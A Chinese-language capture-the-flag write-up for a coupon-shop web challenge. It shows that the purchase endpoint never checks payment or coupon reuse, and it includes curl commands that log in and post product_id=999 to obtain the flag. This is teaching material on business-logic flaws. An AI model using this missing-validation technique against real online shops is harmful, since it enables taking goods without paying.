## 题目原文

> 双十一即将来临，电商平台"极速购"推出了限时秒杀活动！每位用户限领一张优惠券，可用优惠券购买心仪商品。听说Flag限量商品价格高达999元，而优惠券最大面值只有100元...这怎么可能买得起呢？

## 题解

### 入口与指纹

`Werkzeug/3.1.7` + `Python/3.9.25`。登录只要求用户名，没有密码：

```html
<form method="post" action="/login">
  <input name="username" placeholder="请输入用户名">
  <button>立即登录</button>
</form>
```

登录后首页有四个商品，价格分别是 299 / 599 / 1299 / **999**（Flag 限量珍藏版）。商品按钮直接把 id 和价格写进前端：

```html
<button onclick="openPurchaseModal(1, '高端机械键盘', 299)">
<button onclick="openPurchaseModal(999, 'Flag限量珍藏版', 999)">
```

优惠券逻辑：`POST /claim_coupon` 每人一张，面值 10–100 随机；`GET /my_coupons` 查看。

### 关键观察

**1. 购买接口没有任何支付/余额校验。**

```html
<form action="/purchase" method="POST">
  <input type="hidden" name="product_id">
  <input type="checkbox" name="coupon_ids" value="COUPON-xxxxx">
</form>
```

服务端只做两件事：查商品、写入订单。**没有「余额」「实付」「是否已付款」的判断**。所以「999 元的商品，100 元优惠券怎么买得起」这个问题本身就是答案——不用付，接口不检查。

**2. 优惠券只是折扣展示，不是门槛。**

前端 `updateTotal()` 只计算 `max(0, price - discount)` 用于显示。服务端在成单时不校验实付金额，也不要求优惠券必须未使用（同一张券重复提交多次都能成单）。

**3. `product_id=999` 就是 Flag 商品。**

购买成功后首页会直接渲染：

```
🎉 恭喜购买成功！您的Flag: flag{...}
```

并在「我的订单」里留下一条「Flag限量珍藏版」记录。

### 利用链

**Step 1：登录（用户名即可）。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -X POST -d 'username=test1' "http://$T/login"
```

**Step 2：直接购买 999 号商品。**

```bash
curl -s -b cj -X POST -d 'product_id=999' "http://$T/purchase"
# 302 → /
curl -s -b cj "http://$T/" | grep -o 'flag{[^}]*}'
# flag{7ae17a24-fcf4-4027-b9db-10798a9cc440}
```

不需要优惠券、不需要先买别的商品、不需要重复提交。带不带 `coupon_ids` 都能成功。

### 复盘

- **业务逻辑题先问「服务端校验了什么」，而不是「前端怎么算的」。** 前端的 `updateTotal()` 只是展示，服务端成单时完全不看实付金额。
- **「限量商品 + 不够钱」是提示，不是障碍。** 题面强调「999 元 vs 100 元优惠券」，暗示价格不是真正门槛；直接提交高价商品 id 就能验证。
- **价格参数在客户端可见（`openPurchaseModal(999, ..., 999)`）。** 商品 id 和价格都写在前端，不用猜。
- **不需要把优惠券用完。** 本题不存在余额概念，优惠券只是折扣；重复提交同一张券服务器也照收，说明「每人限一张」只在领取时生效，使用时没有校验。
- **这类题只测一次就够。** 直接 POST `product_id=999` 命中后，不必再构造价格篡改或竞态。
